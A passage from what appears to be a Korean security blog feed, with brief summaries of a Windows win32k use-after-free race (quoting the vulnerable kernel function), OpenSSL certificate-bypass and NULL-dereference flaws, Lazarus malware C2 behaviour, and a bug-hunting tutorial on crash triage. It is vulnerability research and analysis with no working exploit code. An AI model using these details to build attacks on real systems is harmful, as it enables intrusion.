    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2139">Issue 2139: Windows Kernel win32k UAF of the PDEVOBJ object via a race condition in NtGdiGetDeviceCapsAll</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>win32k kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Project Zero&#xD300;&#xC774; Windows Kernel&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; race condition&#xC744; &#xD1B5;&#xD55C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xBCF4;&#xACE0;&#xC11C;&#xB97C; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>NtGdiGetDeviceCapsAll</code> &#xD568;&#xC218;&#xB294; GDI&#xC5D0;&#xC11C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; system call&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">...<span class="hljs-function">BOOL <span class="hljs-title">NtGdiGetDeviceCapsAll</span><span class="hljs-params">(HDC hdc, DEVCAPS *devcaps)</span> </span>{BOOL bRet = TRUE;PDEVOBJ *pdevobj;<span class="hljs-keyword">if</span> (PsGetWin32KFilterSet() == <span class="hljs-number">5</span> &amp;&amp; hdc == <span class="hljs-number">0xFFFFFFFFDCDE5000</span>) {pdevobj = gpDispInfo-&gt;pdevobj;<span class="hljs-comment">// DCOBJ scope</span>} <span class="hljs-keyword">else</span> {DCOBJ dc(hdc); <span class="hljs-comment">//[1]</span><span class="hljs-keyword">if</span> (!dc.valid) {EngSetLastError(ERROR_INVALID_HANDLE);DCOBJ::~DCOBJ(dc);<span class="hljs-keyword">return</span> FALSE;}pdevobj = dc.pdevobj;DCOBJ::~DCOBJ(dc);}<span class="hljs-comment">// DCOBJ scope</span>__try {ProbeForWrite(devcaps, <span class="hljs-keyword">sizeof</span>(DEVCAPS), <span class="hljs-number">1</span>);vGetDeviceCaps(pdevobj, devcaps);  <span class="hljs-comment">//[2]</span>}except(EXCEPTION_EXECUTE_HANDLER) {bRet = FALSE;}<span class="hljs-keyword">return</span> bRet;}...</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <a href="https://docs.microsoft.com/ko-kr/cpp/mfc/device-contexts?view=msvc-160">Device Context(DC)</a> &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xC5B4; &#xC7A5;&#xCE58; &#xC815;&#xBCF4;&#xB97C; <code>DEVCAPS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>DCOBJ</code> &#xAC1D;&#xCCB4;&#xC778; <code>dc</code>&#xB97C; <code>else</code> &#xBB38; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC120;&#xC5B8;&#xD574; &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xC758; scope&#xAC00; <code>else</code>&#xBB38;&#xC73C;&#xB85C; &#xD55C;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAC1D;&#xCCB4;&#xAC00; syscall &#xC804;&#xCCB4;&#xC5D0;&#xC11C; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xB97C; &#xC720;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; <code>else</code> &#xCF54;&#xB4DC;&#xB97C; &#xBC97;&#xC5B4;&#xB098;&#xBA74; <code>DCOBJ::~DCOBJ(dc)</code> &#xC18C;&#xBA78;&#xC790;&#xAC00; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>dc</code>&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870;&#xAC00; &#xC0AD;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; <code>dc</code>&#xB97C; &#xCC38;&#xC870;&#xD558;&#xB294; <code>pdevobj</code> &#xAC1D;&#xCCB4;&#xAC00; race condition&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; [1]&#xC5D0;&#xC11C; <code>DCOBJ</code>&#xC0DD;&#xC131;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xCC38;&#xC870;&#xB41C; &#xC774;&#xD6C4; &#xB2E4;&#xB978; &#xC2A4;&#xB808;&#xB4DC;&#xAC00; [2]&#xC5D0;&#xC11C; <code>vGetDeviceCaps()</code> &#xD638;&#xCD9C; &#xC804; &#xB610;&#xB294; &#xB3C4;&#xC911; <code>Device Context</code>&#xB97C; &#xB2EB;&#xB294; &#xACBD;&#xC6B0; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>kernel</tag>
      
      <tag>uaf</tag>
      
      <tag>windows</tag>
      
      <tag>race condition</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CA certificate check bypass &amp; NULL pointer deref in OpenSSL</title>
    <link href="/2021/04/01/insu/2021-04-01/"/>
    <url>/2021/04/01/insu/2021-04-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.openssl.org/news/secadv/20210325.txt">OpenSSL Security Advisory [25 March 2021]</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenSSL</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>OpenSSL&#xC5D0;&#xC11C; CA &#xC778;&#xC99D; bypass&#xC640; Null Pointer Dereference &#xCDE8;&#xC57D;&#xC810;(Denial-of-Service)&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><strong>CA certificate check bypass</strong></p><p>X509_V_FLAG_X509_STRICT flag&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xCD94;&#xAC00; &#xBCF4;&#xC548; &#xAC80;&#xC0AC;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD0C0;&#xC6D0; &#xACE1;&#xC120; &#xBCC0;&#xC218;&#xB97C; &#xC778;&#xCF54;&#xB529;&#xD55C; &#xCCB4;&#xC778;&#xC758; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAC80;&#xC0AC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC774; &#xAC80;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD560; &#xB54C;, &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xC720;&#xD6A8;&#xD55C; CA &#xC778;&#xC815;&#xC11C;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xC774;&#xC804;&#xC758; &#xAC80;&#xC0AC; &#xACB0;&#xACFC;&#xB97C; &#xB36E;&#xC5B4; &#xC50C;&#xC6CC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>Null pointer dereference</strong></p><p>client&#xC5D0;&#xC11C; &#xC870;&#xC791;&#xB41C; renegotiation ClientHello message&#xB97C; &#xBCF4;&#xB0B8; &#xACBD;&#xC6B0;, &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; initalize&#xC5D0;&#xC11C; TLSv1.2 renegotiation ClientHello&#xAC00; signature_algorithms extension&#xC744; &#xC124;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC;, signature_algorithms_cert extension&#xC744; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;&#xBA74; null pointer deref &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <a href="https://github.com/terorie/cve-2021-3449">&#xB9C1;&#xD06C;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>cve</tag>
      
      <tag>openssl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 일본을 타깃으로 한 라자루스 멀웨어 VSingle, ValeforBeta</title>
    <link href="/2021/04/01/idioth/2021-04-01/"/>
    <url>/2021/04/01/idioth/2021-04-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html">Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Japanese orgainsations</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC77C;&#xBCF8;&#xC744; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xB77C;&#xC790;&#xB8E8;&#xC2A4;&#xAC00; &#xC0AC;&#xC6A9;&#xD55C; &#xBA40;&#xC6E8;&#xC5B4; VSingle&#xACFC; ValeforBeta&#xC5D0; &#xB300;&#xD55C; &#xBD84;&#xC11D; &#xBCF4;&#xACE0;&#xC11C;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>VSingle&#xC740; &#xC6D0;&#xACA9; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;, &#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC0F; &#xC2E4;&#xD589;&#xC744; &#xD558;&#xB294; HTTP &#xBD07;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBA40;&#xC6E8;&#xC5B4;&#xB294; &#xC124;&#xCE58;&#xB418;&#xBA74; Explorer&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; DLL injection&#xC744; &#xD1B5;&#xD574; &#xBA54;&#xC778; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. VSingle&#xC740; HTTP GET request&#xB97C; &#xD1B5;&#xD574; C2 &#xC11C;&#xBC84;&#xC640; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. request&#xB294; base64&#xB85C; &#xC778;&#xCF54;&#xB529; &#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA70;, IP &#xC8FC;&#xC18C;, Windows &#xBC84;&#xC804; &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;. response&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xD3EC;&#xD568;&#xB41C; AES &#xC554;&#xD638;&#xD654; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. VSingle&#xC774; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC;</li><li>communication interval &#xC124;&#xC815;</li><li>&#xC784;&#xC758; &#xBA85;&#xB839; &#xC2E4;&#xD589;</li><li>&#xD50C;&#xB7EC;&#xADF8;&#xC778; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;/&#xC2E4;&#xD589;</li><li>&#xC5C5;&#xB370;&#xC774;&#xD2B8;</li><li>&#xBA40;&#xC6E8;&#xC5B4; &#xC815;&#xBCF4; &#xC804;&#xC1A1;</li><li>uninstall</li><li>&#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xD30C;&#xC77C;</li></ol><p>VSingle&#xC740; 4 &#xAC00;&#xC9C0; &#xC720;&#xD615;&#xC758; &#xD50C;&#xB7EC;&#xADF8;&#xC778;(Windows PE &#xD30C;&#xC77C;, VBS &#xD30C;&#xC77C;, BAT &#xD30C;&#xC77C;, &#xC258; &#xCF54;&#xB4DC;)&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC740; <code>%TEMP%</code> &#xD3F4;&#xB354;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xD6C4; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC81C;&#xC678;&#xD55C; 3&#xAC1C;&#xC758; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>ValeforBeta&#xB294; Delphi&#xB85C; &#xC791;&#xC131;&#xB41C; HTTP &#xBD07;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;, &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC;, &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xAE30;&#xB2A5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>INTERNET_OPEN_TYPE_DIRECT</code>, <code>INTERNET_OPEN_TYPE_PRECONFIG</code>, <code>INTERNET_OPEN_TYPE_PROXY</code>&#xC758; access type&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC73C;&#xBA70; POST request&#xB97C; &#xD1B5;&#xD574; C2 &#xC11C;&#xBC84;&#xC640; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. POST request&#xC5D0;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xACE0; &#xCFE0;&#xD0A4; &#xD5E4;&#xB354;&#xC758; <code>JSESSIONID=</code> &#xB4A4;&#xC5D0; &#xAC10;&#xC5FC;&#xB41C; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xC815;&#xBCF4;&#xAC00; base64 &#xC778;&#xCF54;&#xB529; &#xB418;&#xC5B4; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>lazarus</tag>
      
      <tag>bot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 버그헌팅 튜토리얼 Part 4</title>
    <link href="/2021/03/31/l0ch/bughunting-tutorials-part4/"/>
    <url>/2021/03/31/l0ch/bughunting-tutorials-part4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 2</a></p><p><a href="https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 3</a></p><p>&#xC5B4;&#xB290;&#xB367; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. Part 3 &#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xB0B4;&#xC6A9;&#xC774;&#xB2C8; &#xAE34;&#xB9D0; &#xC5C6;&#xC774; &#xBC14;&#xB85C; &#xC2DC;&#xC791;&#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p><hr><p>&#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD574;&#xBCFC; &#xAC81;&#xB2C8;&#xB2E4;. &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xC5B4;&#xB290; &#xC815;&#xB3C4;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBD10;&#xC57C; &#xD558;&#xB294;&#xC9C0; &#xC0AC;&#xC774;&#xC988;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xC774;&#xAC78; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC88B;&#xC744;&#xC9C0;&#xB97C; &#xD310;&#xB2E8;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xBC95; &#xC5ED;&#xC2DC; &#xC704;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xB85C;(&#xD0D1;&#xB2E4;&#xC6B4;) &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC704;&#xB85C;(&#xBC14;&#xD140;&#xC5C5;) &#xBB58; &#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xB358; &#xC0C1;&#xAD00;&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xC790;&#xC2E0;&#xC774; &#xD3B8;&#xD558;&#xC2E0; &#xB300;&#xB85C; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xBC14;&#xD140;&#xC5C5; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD560; &#xB54C;&#xC5D0;&#xB294; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xD568;&#xC218;&#xC758; &#xCC98;&#xC74C; &#xBD80;&#xBD84;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xC5B4;&#xC11C; &#xBC14;&#xB85C; &#xC9C1;&#xC804;&#xC758; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xD558;&#xB098;&#xD558;&#xB098; &#xC62C;&#xB77C;&#xAC00;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xD0D1;&#xB2E4;&#xC6B4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD560; &#xACBD;&#xC6B0; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xACFC; &#xC815;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC801;&#xC808;&#xD788; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xC81C;&#xC77C; &#xC704;(&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xD568;&#xC218;)&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC778;&#xC790;&#xB97C; &#xBCF4;&#xACE0; &#xBA3C;&#xC800; &#xC815;&#xC801; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xACB0;&#xACFC;&#xB4E4;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xAC19;&#xC774; &#xC218;&#xD589;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB098;&#xB294; &#xC544;&#xBB34; &#xC0DD;&#xAC01;&#xC774; &#xC5C6;&#xB2E4;!!! &#xADF8;&#xB0E5; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xCD5C;&#xB300;&#xD55C; &#xC904;&#xC774;&#xACE0; &#xC2F6;&#xC5B4;&#xC694;!!! &#xC2DC;&#xAC04;&#xC740; &#xB9CE;&#xC544;&#xC694;!!!(&#xB294; &#xAC1C;&#xBFD4; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB294; &#xBB35;&#xD788;&#xBA74; &#xB625; &#xB429;&#xB2C8;&#xB2E4;)&#xB77C;&#xACE0; &#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; &#xADF8;&#xB0E5; &#xC81C;&#xC77C; &#xC704;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xC5D0;&#xC11C; p &#xB204;&#xB974;&#xACE0; &#xD06C;&#xB798;&#xC2DC; &#xD130;&#xC9C0;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC7AC;&#xC2DC;&#xC791;&#xD558;&#xACE0; &#xADF8; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xAC00;&#xC11C; &#xB2E4;&#xC2DC; p &#xB204;&#xB974;&#xACE0;&#x2026; &#xC774;&#xB807;&#xAC8C; &#xCB49;&#xCB49; &#xB0B4;&#xB824;&#xAC00;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xC2DD;&#xD558;&#xC9C0;&#xB9CC; &#xD655;&#xC2E4;&#xD558;&#xAE30;&#xB3C4; &#xD558;&#xC8E0;&#x2026;. &#xB294; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44; &#xAC1C;&#xCA54;&#x2026; &#xC2A4;&#xB808;&#xB4DC; &#xC798;&#xBABB; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB9AC;&#xC5BC; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44;&#x2026; (&#xC2A4;&#xB808;&#xB4DC;&#xB294; &#xD799;&#xC744; &#xACF5;&#xC720;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xC2A4;&#xB798;&#xB4DC;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD799;&#xC5D0;&#xC11C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2A4;&#xB808;&#xB4DC; &#xB9D0;&#xACE0; &#xB2E4;&#xB978; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C;&#xB3C4; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;)&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xBB50; &#xADF8;&#xB798;&#xB3C4; &#xC774;&#xAC83;&#xB9CC;&#xD07C; &#xC0DD;&#xAC01; &#xC5C6;&#xC774; &#xD558;&#xB294; &#xAC74; &#xC5C6;&#xB294; &#xAC70; &#xAC19;&#xB124;&#xC6AC;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; (&#xC9C0;&#xADF9;&#xD788; &#xCF5C; &#xC2A4;&#xD0DD; &#xBCF5;&#xAD6C;&#xC5D0;&#xB9CC; &#xD574;&#xB2F9;&#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;&#x2026; &#xACB0;&#xAD6D;&#xC740; &#xB2E4; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xB3FC;&#xC694; &#x3160;&#x3160;)</p><p>&#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xCC9C;&#xCC9C;&#xD788; &#xB530;&#xB77C;&#xB2E4;&#xAC00; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>ImLoader+0x27BB0</code> &#xC5D0;&#xC11C; &#xD5E4;&#xB354; &#xAC80;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xCEA1;&#xCC98; &#xC0AC;&#xC9C4;&#xC758; &#xD5E5;&#xC2A4;&#xB808;&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xC774;&#xB2E4; &#xBC84;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xC870;&#xAE08;&#xC529; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;)</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--048.png" alt="bughunting-tutorials-part4/image--048.png"></p><p><code>v7</code>&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xC774; <code>MB</code>(&#xC22B;&#xC790;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C; &#xC55E;&#xC5D0;&#xC11C; &#xBABB; &#xCC3E;&#xC740; &#xAC70;&#xB124;&#xC694;)&#xC778;&#xC9C0; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xD2C0;&#xB9AC;&#xBA74; &#xC775;&#xC149;&#xC158;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xACE0; &#xB9DE;&#xB2E4;&#xBA74; &#xD574;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; <code>sub_427620</code> &#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xD574;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACA0;&#xB124;&#xC694;!!</p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; &#xC2E4;&#xC81C; &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC9C4;&#xD589;&#xB418;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--050.jpg" alt="bughunting-tutorials-part4/image--050.jpg"></p><p>&#xBA3C;&#xC800; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4; &#xC628; Stream &#xAC12;&#xC744; &#xD1B5;&#xD574; <code>BITMAPINFOHEADER</code> &#xC758; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xC9C0;&#xC5ED;&#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB2F9;&#xC5F0;&#xD788; &#xC6B0;&#xB9AC;&#xAC00; &#xC218;&#xC815;&#xD55C; 